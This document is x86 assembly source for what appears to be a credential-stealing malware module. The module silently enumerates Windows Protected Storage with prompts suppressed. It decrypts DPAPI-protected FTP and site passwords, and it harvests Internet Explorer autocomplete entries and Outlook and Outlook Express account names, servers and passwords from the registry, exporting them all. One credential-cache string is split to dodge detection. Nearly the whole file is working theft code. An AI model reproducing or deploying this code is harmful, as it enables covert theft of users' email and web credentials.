; Tested on:
;	Internet Explorer 6, SP1
;	Outlook 2002
;	Outlook Express 6.0

.data?
	@AllocMem	<lpPSBasePath>,		<1024>
	ppProvider	dd	?
	dwPStoreCreate	dd	?
	
.data
	@AllocStr	<szPSExplorer>,		<"internet explorer">
	@AllocStr	<szPSSites>,		<"Winin">
	@AllocStr	<szPSSites2>,		<"etCacheCredentials">
	@AllocStr	<szPSDPAPI>,		<"DPAPI: ">
	
	@AllocStr	<szPSIdentType>,	<"Identification">
	@AllocStr	<szPSIdentSubtype>,	<"INETCOMM Server Passwords"> 		; Express
	@AllocStr	<szPSIdentSubtype2>,	<"Outlook Account Manager Passwords"> 	; Outlook
	@AllocStr	<szPSAccounts>,		<"Software\Microsoft\Internet Account Manager\Accounts">
	@AllocStr	<szPSOutlook>,		<"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook">
	@AllocStr	<szPSIdents>,		<"Identities">
	@AllocStr	<szPSFmt>,		<"%s\%s\%s">
	@AllocStr	<szPSFmt2>,		<"%s\%s">
	szPSValData	db 	"SMTP Email Address",0 	; Express
			db 	"Email",0		; Outlook
			db 	"POP3 Password",0	; Outlook
			db 	"POP3 Password2",0	; Express			
			db 	"POP3 Server",0		; Both
			db 	"POP3 User Name",0	; Express
			db 	"POP3 User",0		; Outlook
			db 	"IMAP Password",0	; Outlook
			db 	"IMAP Password2",0	; Express
			db 	"IMAP Server",0		; Both
			db 	"IMAP User",0		; Outlook
			db 	"IMAP User Name",0,0 	; Express
	szPStorecLib	db	"pstorec.dll",0
			db	"PStoreCreateInstance",0,0
			
	szCryptLib	db	"crypt32.dll",0
			db	"CryptUnprotectData",0,0
	IsPStorecLoaded db	FALSE
	dwCryptUnprotect dd	0
	
.code

PST_KEY_CURRENT_USER equ 0      ; Specifies that the storage is maintained in the current user section of the registry.
PST_KEY_LOCAL_MACHINE equ 1     ; Specifies that the storage is maintained in the local machine section of the registry.

; Specifies whether the prompt dialog is shown. This flag is ignored in Windows XP.
PST_PF_ALWAYS_SHOW equ 1        ; Requests that the provider show the prompt dialog to the user even if not required for this access.
PST_PF_NEVER_SHOW equ 2         ; Do not show the prompt dialog to the user.

; IPStore Interface
IPStore struct DWORD
	IPStore_QueryInterface          comethod3       ?
	IPStore_AddRef                  comethod1       ?
	IPStore_Release                 comethod1       ?
	IPStore_GetInfo                 comethod2       ?
	IPStore_GetProvParam            comethod5       ?
	IPStore_SetProvParam            comethod5       ?
	IPStore_CreateType              comethod5       ?
	IPStore_GetTypeInfo             comethod5       ?
	IPStore_DeleteType              comethod4       ?
	IPStore_CreateSubtype           comethod7       ?
	IPStore_GetSubtypeInfo          comethod6       ?
	IPStore_DeleteSubtype           comethod5       ?
	IPStore_ReadAccessRuleset       comethod6       ?
	IPStore_WriteAccessRuleset      comethod6       ?
	IPStore_EnumTypes               comethod4       ?
	IPStore_EnumSubtypes            comethod5       ?
	IPStore_DeleteItem              comethod7       ?
	IPStore_ReadItem                comethod9       ?
	IPStore_WriteItem               comethod10      ?
	IPStore_OpenItem                comethod8       ?
	IPStore_CloseItem               comethod6       ?
	IPStore_EnumItems               comethod6       ?
IPStore ends

; IEnumPStoreTypes/IEnumPStoreItems Interface (there's difference in 
; pointer type of ::Next function only)
IEnumPStoreTypes struct DWORD
	IEnumPStoreTypes_QueryInterface comethod3       ?
	IEnumPStoreTypes_AddRef         comethod1       ?
	IEnumPStoreTypes_Release        comethod1       ?
	IEnumPStoreTypes_Next           comethod4       ?
	IEnumPStoreTypes_Skip           comethod2       ?
	IEnumPStoreTypes_Reset          comethod1       ?
	IEnumPStoreTypes_Clone          comethod2       ?
IEnumPStoreTypes ends

; Used while reading item data
_PST_PROMPTINFO struct DWORD
	cbSize                        	DWORD           ?
	dwPromptFlags                   DWORD           ?
	hwndApp                         DWORD           ?
	szPrompt                        DWORD           ?
_PST_PROMPTINFO ends

; Crypt32
CRYPTPROTECT_UI_FORBIDDEN equ 1 ; This flag is used for remote situations where the user interface (UI) is not an option.

DATA_BLOB struct DWORD
	cbData				dd	? ; Data length
	pbData				dd	? ; Pointer to data		
DATA_BLOB ends


; Convert pType GUID to readable string
TypeNameToStr proc pType, lpBuf: DWORD
	LOCAL   pst: DWORD
        
	coinvoke ppProvider, IPStore, GetTypeInfo, 0, pType, addr pst, 0
	test    eax, eax
	jnz     @ret
        
	mov     edx, pst
	invoke  WideCharToMultiByte, CP_ACP, 0, dword ptr[edx+4], -1, lpBuf, 1023, NULL, NULL
	invoke  CoTaskMemFree, pst

@ret:
	ret
TypeNameToStr endp

; Convert pType & pSubtype GUIDs to readable string
SubtypeNameToStr proc pType, pSubtype, lpBuf: DWORD
        LOCAL   pst: DWORD
        
        coinvoke ppProvider, IPStore, GetSubtypeInfo, 0, pType, pSubtype, addr pst, 0
        test    eax, eax
        jnz     @ret
        
        mov     edx, pst
        invoke  WideCharToMultiByte, CP_ACP, 0, dword ptr[edx+4], -1, lpBuf, 1023, NULL, NULL
        invoke  CoTaskMemFree, pst

@ret:
	ret
SubtypeNameToStr endp

PSExport proc dwType, lpName, pData, pDataLen: DWORD
	invoke	lstrlenW, lpName
	shl	eax, 1
	add	eax, 2 ;  NULL
	invoke	ExportData, dwType, SUBTYPE_PS_NAME, lpName, eax
	invoke	ExportData, dwType, SUBTYPE_PS_DATA, pData, pDataLen
	ret
PSExport endp

ReadPSItemValue proc uses ebx pType, pSubtype, pItem: DWORD
	LOCAL   szType[1024]: BYTE
	LOCAL   szSubtype[1024]: BYTE
	LOCAL   szItem[1024]: BYTE
        LOCAL   pspi: _PST_PROMPTINFO
        LOCAL   pData, pDataLen: DWORD
        LOCAL	InBlob: DATA_BLOB
        LOCAL	OutBlob: DATA_BLOB

	; Get readable names, convert them to ANSI strings
	invoke  TypeNameToStr, pType, addr szType
	invoke  SubtypeNameToStr, pType, pSubtype, addr szSubtype
	invoke  WideCharToMultiByte, CP_ACP, 0, pItem, -1, addr szItem, 1023, NULL, NULL
	
	; Set prompt info structure
	mov     pspi.cbSize, sizeof _PST_PROMPTINFO
	mov     pspi.dwPromptFlags, PST_PF_NEVER_SHOW
	mov     pspi.hwndApp, 0
	mov     pspi.szPrompt, 0

	; pData pointer is allocated automaticly and should be freed using 
	; CoTaskMemFree function
	coinvoke ppProvider, IPStore, ReadItem, 0, pType, pSubtype, pItem, addr pDataLen, addr pData, addr pspi, 0
	cmp	pDataLen, 0
	jz	@ret
	cmp	pData, 0
	jz	@ret

	; Autocomplete
        invoke  lstrcmpi, addr szType, offset szPSExplorer
        test	eax, eax
        jnz	@F
	
	invoke  lstrcmpi, addr szSubtype, offset szPSExplorer
        test	eax, eax
        jnz	@F

	invoke	PSExport, TYPE_PS_AUTO, pItem, pData, pDataLen

@@:
        ; Protected sites & FTP passwords
        invoke  lstrcmpi, addr szType, offset szPSSites
        test	eax, eax
        jnz	@F
                
	invoke  lstrcmpi, addr szSubtype, offset szPSSites
        test	eax, eax
        jnz	@F
        
	; Some FTP items are encrypted using DPAPI, decrypt them
        invoke	StrStrI, addr szItem, addr szPSDPAPI
        .IF	eax
		; Check if crypt32.dll was loaded
		cmp	dwCryptUnprotect, 0
		jz	@F
		
		m2m	InBlob.cbData, pDataLen
		m2m	InBlob.pbData, pData
		
		lea	eax, OutBlob
		push	eax
		push	CRYPTPROTECT_UI_FORBIDDEN
		push	0
		push	0
		push	0
		push	0
		lea	eax, InBlob
		push	eax		
		call	dwCryptUnprotect
		
		; Export decrypted data (password)
		.IF	eax
			invoke	PSExport, TYPE_PS_SITE, pItem, OutBlob.pbData, OutBlob.cbData	
			invoke	LocalFree, OutBlob.pbData
		.ENDIF
	.ELSE
		invoke	PSExport, TYPE_PS_SITE, pItem, pData, pDataLen
        .ENDIF
	
@@:
	; Outlook
	invoke  lstrcmpi, addr szType, offset szPSIdentType
	test	eax, eax
	jnz	@F
	
	invoke  lstrcmpi, addr szSubtype, offset szPSIdentSubtype
	test	eax, eax
	jz	@outlook

	invoke  lstrcmpi, addr szSubtype, offset szPSIdentSubtype2
	test	eax, eax
	jnz	@F	

@outlook:
	invoke	PSExport, TYPE_PS_OUTLOOK, pItem, pData, pDataLen

@@:
	invoke  CoTaskMemFree, pData

@ret:
	ret
ReadPSItemValue endp

ReadPSItems proc uses edi pType, pSubtype: DWORD
        LOCAL   WSTRBuf[16]: DWORD
        LOCAL   ppEnum, celtfetched: DWORD

        coinvoke ppProvider, IPStore, EnumItems, 0, pType, pSubtype, 0, addr ppEnum
        test    eax, eax
        jnz     @ret

@loop:
        ; Here should be IEnumPStoreItems, but it is similar to IEnumPStoreTypes
        ; so I do not use it
        coinvoke ppEnum, IEnumPStoreTypes, Next, 16, addr WSTRBuf, addr celtfetched
        cmp     celtfetched, 0
        jz      @release

        ; Enumerated Items are in WSTRBuf now
        lea     edi, WSTRBuf

@inner_loop:
        invoke  ReadPSItemValue, pType, pSubtype, dword ptr[edi]
        
        ; Free memory
        invoke  CoTaskMemFree, dword ptr[edi]
        
        ; Next entry
        add     edi, 4
        dec     celtfetched
        jnz     @inner_loop

        jmp     @loop

@release:
        ; Release interface
        coinvoke ppEnum, IEnumPStoreTypes, Release

@ret:
        ret
ReadPSItems endp

ReadPSSubtypes proc uses edi pType: DWORD
        LOCAL   GUIDBuf[16]: GUID
        LOCAL   ppEnum, celtfetched: DWORD

        ; Get IEnumPStoreTypes interface
        coinvoke ppProvider, IPStore, EnumSubtypes, 0, pType, 0, addr ppEnum
        test    eax, eax
        jnz     @ret

@loop:  
        coinvoke ppEnum, IEnumPStoreTypes, Next, 16, addr GUIDBuf, addr celtfetched
        cmp     celtfetched, 0
        jz      @release

        ; Enumerate subtypes, for each subtype enumerate items
        lea     edi, GUIDBuf 

@inner_loop:
        invoke  ReadPSItems, pType, edi
        
        ; Next entry
        add     edi, sizeof GUID
        dec     celtfetched
        jnz     @inner_loop

        jmp     @loop

@release:
        ; Release interface
        coinvoke ppEnum, IEnumPStoreTypes, Release

@ret:
        ret
ReadPSSubtypes endp

ReadPSTypes proc uses edi
        LOCAL   GUIDBuf[16]: GUID
        LOCAL   ppEnum, celtfetched: DWORD

        ; Get IEnumPStoreTypes interface
        coinvoke ppProvider, IPStore, EnumTypes, 0, 0, addr ppEnum
        test    eax, eax
        jnz     @ret
        
@loop:  
        coinvoke ppEnum, IEnumPStoreTypes, Next, 16, addr GUIDBuf, addr celtfetched
        cmp     celtfetched, 0
        jz      @release

        ; Enumerated types are in GUIDBuf now, for each type enumerate subtypes
        lea     edi, GUIDBuf

@inner_loop:
        invoke  ReadPSSubtypes, edi
        
        ; Next item
        add     edi, sizeof GUID
        dec     celtfetched
        jnz     @inner_loop

        jmp     @loop

@release:
        ; Release interface
        coinvoke ppEnum, IEnumPStoreTypes, Release

@ret:
        ret
ReadPSTypes endp

GetOutlookUserValues proc uses edi
	LOCAL	lpData[1024]: BYTE
	LOCAL	dwBufLen: DWORD
	
	invoke	ExportData, TYPE_PS_OUT_DATA, SUBTYPE_OUT_BEGIN, 0, 0
	
	mov	edi, offset szPSValData
	
@l:
	mov	dwBufLen, 1023
	invoke	RegReadValue, HKEY_CURRENT_USER, offset lpPSBasePath, edi, addr lpData, addr dwBufLen
	.IF	eax
		invoke	ExportStr, TYPE_PS_OUT_DATA, SUBTYPE_OUT_NAME, edi
		invoke	ExportData, TYPE_PS_OUT_DATA, SUBTYPE_OUT_DATA, addr lpData, dwBufLen
	.ENDIF
	@Next	@l
	
	invoke	ExportData, TYPE_PS_OUT_DATA, SUBTYPE_OUT_END, 0, 0
	
	ret
GetOutlookUserValues endp

; Sample:
; HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000001        
GetOutlookUserNames proc uses edi
        LOCAL   hkHandle, lpDir, lpNameLen, KeyIndex: DWORD

        invoke  RegOpenKey, HKEY_CURRENT_USER, offset lpPSBasePath, addr hkHandle
        test    eax, eax
        jnz     @end

        invoke  lstrlen, offset lpPSBasePath
        mov	edi, offset lpPSBasePath 
        add     edi, eax

        invoke  GlobalAlloc, GPTR, 1024
        mov     lpDir, eax

        mov     KeyIndex, 0

@loop_enum:
        mov     lpNameLen, 1023
        xor	eax, eax
        invoke  RegEnumKeyEx, hkHandle, KeyIndex, lpDir, addr lpNameLen, eax, eax, eax, eax
        test    eax, eax
        jnz     @loop_end

        mov	word ptr[edi], '\'
        invoke	lstrcpy, addr [edi+1], lpDir  
        invoke  GetOutlookUserValues

        inc     KeyIndex
        jmp     @loop_enum

@loop_end:
        invoke  GlobalFree, lpDir
        invoke  RegCloseKey, hkHandle

@end:        
        ret
GetOutlookUserNames endp

; "Outlook Express" only
; Sample:
; HKEY_CURRENT_USER\Identities\{1979BF4A-F47D-41E2-904F-E896760DC2DF}\Software\Microsoft\Internet Account Manager\Accounts\00000001
GetOutlookUserNames2 proc
        LOCAL   hkHandle, lpDir, lpNameLen, KeyIndex: DWORD

        invoke  RegOpenKey, HKEY_CURRENT_USER, offset szPSIdents, addr hkHandle
        test    eax, eax
        jnz     @end

        invoke  GlobalAlloc, GPTR, 1024
        mov     lpDir, eax

        mov     KeyIndex, 0

@loop_enum:
        mov     lpNameLen, 1023
        xor	eax, eax
        invoke  RegEnumKeyEx, hkHandle, KeyIndex, lpDir, addr lpNameLen, eax, eax, eax, eax
        test    eax, eax
        jnz     @loop_end

	invoke	wsprintf, offset lpPSBasePath, offset szPSFmt, offset szPSIdents, lpDir, offset szPSAccounts  
        invoke  GetOutlookUserNames

        inc     KeyIndex
        jmp     @loop_enum

@loop_end:
        invoke  GlobalFree, lpDir
        invoke  RegCloseKey, hkHandle        

@end:        
        ret
GetOutlookUserNames2 endp

; "Outlook" only
; Sample:
; HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\00000001
GetOutlookUserNames3 proc
	LOCAL   hkHandle, lpDir, lpNameLen, KeyIndex: DWORD

	invoke  RegOpenKey, HKEY_CURRENT_USER, offset szPSOutlook, addr hkHandle
	test    eax, eax
	jnz     @end

	invoke  GlobalAlloc, GPTR, 1024
	mov     lpDir, eax

	mov     KeyIndex, 0

@loop_enum:
	mov     lpNameLen, 1023
	xor	eax, eax
	invoke  RegEnumKeyEx, hkHandle, KeyIndex, lpDir, addr lpNameLen, eax, eax, eax, eax
	test    eax, eax
	jnz     @loop_end

	invoke	wsprintf, offset lpPSBasePath, offset szPSFmt2, offset szPSOutlook, lpDir
	invoke  GetOutlookUserNames

	inc     KeyIndex
	jmp     @loop_enum

@loop_end:
	invoke  GlobalFree, lpDir
	invoke  RegCloseKey, hkHandle

@end:        
	ret
GetOutlookUserNames3 endp

GetPStorageOutput proc
	invoke lstrcat,offset szPSSites,offset szPSSites2
	; Write header
	invoke	ExportModule, MODULE_PSTORAGE

	.IF	!IsPStorecLoaded
		; Load pstorec.dll
		invoke	DoLoadLib, offset szPStorecLib, offset dwPStoreCreate
		test	eax, eax
		jz	@ret
		
		; Load crypt32.dll
		invoke	DoLoadLib, offset szCryptLib, offset dwCryptUnprotect
		mov	IsPStorecLoaded, TRUE
	.ENDIF
	
        ; Get interface to IPStore
        xor     eax, eax
        push    eax
        push    eax
        push    eax
        lea     edx, ppProvider
        push    edx
        call    dwPStoreCreate
        test    eax, eax
        jnz     @ret

	; Read Protected Storage data
        invoke	ReadPSTypes
        
	; Outlook data
	invoke  lstrcpy, offset lpPSBasePath, offset szPSAccounts
	invoke	GetOutlookUserNames	; Express
	invoke	GetOutlookUserNames2	; Express
	invoke	GetOutlookUserNames3	; Outlook
	
	; Release interface
	coinvoke ppProvider, IPStore, Release 	
	
@ret:
	ret
GetPStorageOutput endp